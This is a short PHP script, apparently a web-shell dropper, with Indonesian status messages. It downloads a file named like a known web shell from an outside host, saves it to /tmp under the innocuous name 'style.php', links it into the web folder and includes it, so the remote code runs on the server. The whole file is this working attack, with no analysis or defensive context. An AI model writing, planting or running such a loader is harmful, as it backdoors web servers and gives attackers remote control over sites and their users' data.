<?php
$remoteFile = 'https://shell.prinsh.com/Nathan/0byt3m1n1.txt';
$localTmpFile = '/tmp/style.php';
$localSymlink = 'style.php';

// Download file from URL and save it to /tmp/
if (file_put_contents($localTmpFile, file_get_contents($remoteFile)) !== false) {
    echo 'Konten berhasil diunduh dan disimpan di /tmp/.';

    // Create a symlink to the file in the same folder
    if (symlink('/tmp/style.php', $localSymlink)) {
        echo 'Symlink berhasil dibuat.';

        // Include the symlinked file
        include $localSymlink;

        // Additional actions if needed
    } else {
        echo 'Gagal membuat symlink.';
    }
} else {
    echo 'Gagal mengunduh konten dari URL atau menyimpan di /tmp/.';
}
?>
